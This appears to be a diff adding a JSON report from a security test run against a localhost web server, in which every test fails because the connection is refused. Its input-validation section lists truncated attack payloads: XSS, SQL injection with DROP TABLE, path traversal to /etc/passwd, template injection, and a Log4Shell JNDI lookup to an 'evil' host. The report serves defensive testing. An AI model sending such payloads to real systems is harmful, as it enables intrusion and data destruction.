@@ -1,0 +1,115 @@
+{
+  "timestamp": "2026-02-01T20:23:30.818038",
+  "total_tests": 9,
+  "passed_tests": 0,
+  "failed_tests": 9,
+  "success_rate": 0.0,
+  "test_results": [
+    {
+      "test_name": "Production Server Availability",
+      "passed": false,
+      "message": "Connection failed: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /health (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it\"))",
+      "timestamp": "2026-02-01T20:17:48.534023",
+      "details": {}
+    },
+    {
+      "test_name": "Security Status Endpoint",
+      "passed": false,
+      "message": "Request failed: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /security-status (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it\"))",
+      "timestamp": "2026-02-01T20:17:52.634749",
+      "details": {}
+    },
+    {
+      "test_name": "HTTPS Enforcement",
+      "passed": false,
+      "message": "Request failed: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: / (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it\"))",
+      "timestamp": "2026-02-01T20:17:56.727908",
+      "details": {}
+    },
+    {
+      "test_name": "Security Headers",
+      "passed": false,
+      "message": "Request failed: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: / (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it\"))",
+      "timestamp": "2026-02-01T20:18:00.831446",
+      "details": {}
+    },
+    {
+      "test_name": "Rate Limiting",
+      "passed": false,
+      "message": "Rate limiting: Not triggered, 0 successful requests",
+      "timestamp": "2026-02-01T20:22:45.860516",
+      "details": {
+        "total_requests": 70,
+        "successful_requests": 0,
+        "rate_limited": false,
+        "total_time": 281.0226743221283,
+        "requests_per_second": 0.24909022081172352
+      }
+    },
+    {
+      "test_name": "CSRF Protection",
+      "passed": false,
+      "message": "Request failed: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /api/csrf-token (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it\"))",
+      "timestamp": "2026-02-01T20:22:49.943711",
+      "details": {}
+    },
+    {
+      "test_name": "Concurrent Requests",
+      "passed": false,
+      "message": "Concurrent requests: 0/20 successful",
+      "timestamp": "2026-02-01T20:22:58.161689",
+      "details": {
+        "successful_requests": 0,
+        "avg_response_time": 0.0,
+        "max_response_time": 0,
+        "success_rate": 0.0
+      }
+    },
+    {
+      "test_name": "Security Logging",
+      "passed": false,
+      "message": "Security log file not found",
+      "timestamp": "2026-02-01T20:22:58.162112",
+      "details": {}
+    },
+    {
+      "test_name": "Input Validation",
+      "passed": false,
+      "message": "Input validation: 0/7 payloads properly handled",
+      "timestamp": "2026-02-01T20:23:30.817580",
+      "details": {
+        "passed_validations": 0,
+        "total_tests": 7,
+        "pass_rate": 0.0,
+        "results": [
+          {
+            "payload": "<script>alert('xss')...",
+            "error": "HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: / (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it\"))",
+            "validation_passed": false
+          },
+          {
+            "payload": "'; DROP TABLE users;...",
+            "error": "HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: / (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it\"))",
+            "validation_passed": false
+          },
+          {
+            "payload": "../../../etc/passwd...",
+            "error": "HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: / (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it\"))",
+            "validation_passed": false
+          },
+          {
+            "payload": "{{7*7}}...",
+            "error": "HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: / (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it\"))",
+            "validation_passed": false
+          },
+          {
+            "payload": "${jndi:ldap://evil.c...",
+            "error": "HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: / (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it\"))",
+            "validation_passed": false
+          }
+        ]
+      }
+    }
+  ],
+  "overall_status": "FAIL"
+}
